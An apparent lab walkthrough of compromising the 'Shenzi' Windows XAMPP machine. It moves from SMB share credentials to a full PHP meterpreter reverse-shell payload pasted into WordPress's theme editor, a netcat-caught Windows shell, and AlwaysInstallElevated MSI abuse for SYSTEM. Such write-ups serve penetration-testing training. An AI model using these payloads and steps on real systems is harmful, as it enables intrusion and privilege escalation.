# Shenzi
# Shenzi

Exploitation Guide for Shenzi
Summary

Discovering exposed credentials on an open SMB file share, we'll upload a PHP reverse shell to this target to gain an initial foothold. We'll then exploit an insecure registry configuration to install .msi packages as an elevated user.
Enumeration
Nmap

We'll start off with an nmap scan against all TCP ports.

kali@kali~# sudo nmap -p- 192.168.65.55
Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-21 23:18 EST
Nmap scan report for 192.168.65.55
Host is up (0.070s latency).
Not shown: 65527 filtered ports
PORT     STATE SERVICE
21/tcp   open  ftp
80/tcp   open  http
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
443/tcp  open  https
445/tcp  open  microsoft-ds
3306/tcp open  mysql
5040/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 135.45 seconds

The main services of interest here are an FTP server, a web server, and an SMB server.
FTP Enumeration

Anonymous FTP access seems to be disabled.

kali@kali~# ftp 192.168.65.55
Connected to 192.168.65.55.
220-FileZilla Server version 0.9.41 beta
220-written by Tim Kosse (Tim.Kosse@gmx.de)
220 Please visit http://sourceforge.net/projects/filezilla/
Name (192.168.65.55:kali): Anonymous
331 Password required for anonymous
Password:
530 Login or password incorrect!
Login failed.
Remote system type is UNIX.
ftp> 

SMB Enumeration

We do, however, find a Shenzi file share on the SMB server.

kali@kali~# smbclient -L \\\\192.168.65.55
Enter WORKGROUP\kali's password: 

        Sharename       Type      Comment
        ---------       ----      -------
        IPC$            IPC       Remote IPC
        Shenzi          Disk      
SMB1 disabled -- no workgroup available

HTTP Enumeration

Navigating to http://192.168.65.55, we are presented with a default XAMPP dashboard. We can attempt to navigate to the phpMyAdmin page, but it is only accessible on the local network, and the PHP version info does not reveal anything of use to us.
Exploitation
Open Network Share

Since we can anonymously list SMB shares, perhaps there's a chance we can access a share anonymously as well. Let's try to enumerate the Shenzi share.

kali@kali~# smbclient \\\\192.168.65.55\\shenzi
Enter WORKGROUP\kali's password: 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Thu May 28 11:45:09 2020
  ..                                  D        0  Thu May 28 11:45:09 2020
  passwords.txt                       A      894  Thu May 28 11:45:09 2020
  readme_en.txt                       A     7367  Thu May 28 11:45:09 2020
  sess_klk75u2q4rpgfjs3785h6hpipp      A     3879  Thu May 28 11:45:09 2020
  why.tmp                             A      213  Thu May 28 11:45:09 2020
  xampp-control.ini                   A      178  Thu May 28 11:45:09 2020

                12941823 blocks of size 4096. 7642274 blocks available

We are able to connect to the share and list its contents. The passwords.txt file looks promising. Let's download it to our local machine.

smb: \> get passwords.txt
getting file \passwords.txt of size 894 as passwords.txt (3.0 KiloBytes/sec) (average 3.0 KiloBytes/sec)
smb: \> exit

The file contains what appears to be a username and a password for a Wordpress site.

kali@kali~# cat passwords.txt
### XAMPP Default Passwords ###

...

LoadModule dav_module modules/mod_dav.so
   LoadModule dav_fs_module modules/mod_dav_fs.so  
   
   Please do not forget to refresh the WEBDAV authentification (users and passwords).     

5) WordPress:

   User: admin
   Password: FeltHeadwallWight357

Remote Code Execution

More than likely, the referenced Wordpress site is being hosted on this machine. Common wordlist attacks against the web server fail to locate the Wordpress directory. However, since the share name is shenzi, let's try that. If we navigate to http://192.168.65.55/shenzi, we are indeed presented with a Wordpress site.

By default, the Wordpress admin login page is wp-login.php. Navigating there, we find it, enter the credentials and are granted access to the administration portal.

From here, we'll navigate to Appearance -> Theme Editor -> Theme Twenty Twenty to determine the active website theme. If we select a .php page (such as 404.php) we discover that we can directly edit the page's source code.

We can use this ability to execute arbitrary PHP code, including a reverse shell. Let's generate a PHP meterpreter payload with msfvenom.

kali@kali~# msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.49.65 lport=443 -f raw
[-] No platform was selected, choosing Msf::Module::Platform::PHP from the payload
[-] No arch selected, selecting arch: php from the payload
No encoder specified, outputting raw payload
Payload size: 1113 bytes
/*<?php /**/ error_reporting(0); $ip = '192.168.49.65'; $port = 443; if (($f = 'stream_socket_client') && is_callable($f)) { $s = $f("tcp://{$ip}:{$port}"); $s_type = 'stream'; } if (!$s && ($f = 'fsockopen') && is_callable($f)) { $s = $f($ip, $port); $s_type = 'stream'; } if (!$s && ($f = 'socket_create') && is_callable($f)) { $s = $f(AF_INET, SOCK_STREAM, SOL_TCP); $res = @socket_connect($s, $ip, $port); if (!$res) { die(); } $s_type = 'socket'; } if (!$s_type) { die('no socket funcs'); } if (!$s) { die('no socket'); } switch ($s_type) { case 'stream': $len = fread($s, 4); break; case 'socket': $len = socket_read($s, 4); break; } if (!$len) { die(); } $a = unpack("Nlen", $len); $len = $a['len']; $b = ''; while (strlen($b) < $len) { switch ($s_type) { case 'stream': $b .= fread($s, $len-strlen($b)); break; case 'socket': $b .= socket_read($s, $len-strlen($b)); break; } } $GLOBALS['msgsock'] = $s; $GLOBALS['msgsock_type'] = $s_type; if (extension_loaded('suhosin') && ini_get('suhosin.executor.disable_eval')) { $suhosin_bypass=create_function('', $b); $suhosin_bypass(); } else { eval($b); } die();

We'll paste the code into the theme editor for the 404.php page, and click Update File.

Before executing the payload, we'll set up our meterpreter exploit/multi/handler module to catch the reverse shell.

kali@kali~# sudo msfconsole

...

msf5 > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf5 exploit(multi/handler) > set payload php/meterpreter/reverse_tcp
payload => php/meterpreter/reverse_tcp
msf5 exploit(multi/handler) > set LHOST 192.168.49.65
LHOST => 192.168.49.65
msf5 exploit(multi/handler) > set LPORT 443
LPORT => 443
msf5 exploit(multi/handler) > run

[*] Started reverse TCP handler on 192.168.49.65:443

Once the file is updated, and our handler is running, we can navigate to the file to trigger our reverse shell.

Our PHP payload is executed on the server, and a meterpreter session is activated in our exploit handler.

[*] Sending stage (38288 bytes) to 192.168.65.55
[*] Meterpreter session 1 opened (192.168.49.65:443 -> 192.168.65.55:49807) at 2020-12-22 00:23:55 -0500

meterpreter > getuid
Server username: shenzi (0)
meterpreter >

Upgrading PHP Shell

Since PHP reverse shells are somewhat unstable, let's upload a more stable shell, which we'll generate with msfvenom.

kali@kali~# msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.49.65 LPORT=139 -f exe > shell.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of exe file: 7168 bytes

Let's set up a Netcat listener on port 139.

kali@kali~# sudo nc -lvp 139
listening on [any] 139 ...

Next, we can upload and execute the more-stable shell using our meterpreter connection.

meterpreter > upload shell.exe
[*] uploading  : shell.exe -> shell.exe
[*] Uploaded -1.00 B of 7.00 KiB (-0.01%): shell.exe -> shell.exe
[*] uploaded   : shell.exe -> shell.exe
meterpreter > execute -f shell.exe
Process 6060 created.
meterpreter >

We should receive the shell in our Netcat listener.

kali@kali~# sudo nc -lvp 139
listening on [any] 139 ...
192.168.65.55: inverse host lookup failed: Unknown host
connect to [192.168.49.65] from (UNKNOWN) [192.168.65.55] 49808
Microsoft Windows [Version 10.0.18363.836]
(c) 2019 Microsoft Corporation. All rights reserved.

C:\xampp\htdocs\shenzi>whoami
whoami
shenzi\shenzi

C:\xampp\htdocs\shenzi>

Escalation
Local Enumeration

We can use tools such as PowerUp or JAWS to try to find some low-hanging fruit in the system's configuration. These tools reveal a policy that will install MSI packages as SYSTEM.

C:\xampp\htdocs\shenzi>reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer

HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer
    AlwaysInstallElevated    REG_DWORD    0x1


C:\xampp\htdocs\shenzi>reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer

HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows\Installer
    AlwaysInstallElevated    REG_DWORD    0x1


C:\xampp\htdocs\shenzi>

AlwaysInstallElevated MSI Abuse

We can abuse this and escalate our privileges on the target by generating a malicious MSI package that will give us a reverse shell as the NT AUTHORITY\SYSTEM user.

To do this, we'll first generate an MSI package using msfvenom.

kali@kali~# msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.49.65 LPORT=445 -f msi > notavirus.msi
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of msi file: 159744 bytes

We can use our still-active meterpreter shell to upload the MSI package to the target.

meterpreter > upload notavirus.msi
[*] uploading  : notavirus.msi -> notavirus.msi
[*] Uploaded -1.00 B of 156.00 KiB (-0.0%): notavirus.msi -> notavirus.msi
[*] uploaded   : notavirus.msi -> notavirus.msi
meterpreter > 

Let's run another Netcat listener to catch our reverse shell.

kali@kali~# sudo nc -lvp 445  
listening on [any] 445 ...

Finally, we can install our malicious MSI package on the target using msiexec.

C:\xampp\htdocs\shenzi>msiexec /i "C:\xampp\htdocs\shenzi\notavirus.msi"
msiexec /i "C:\xampp\htdocs\shenzi\notavirus.msi"

C:\xampp\htdocs\shenzi>

Once we've done this, our listener indicates that we have received a reverse shell with NT AUTHORITY\SYSTEM level privileges.

kali@kali~# sudo nc -lvp 445  
listening on [any] 445 ...
192.168.65.55: inverse host lookup failed: Unknown host
connect to [192.168.49.65] from (UNKNOWN) [192.168.65.55] 49815
Microsoft Windows [Version 10.0.18363.836]
(c) 2019 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system

C:\Windows\system32>

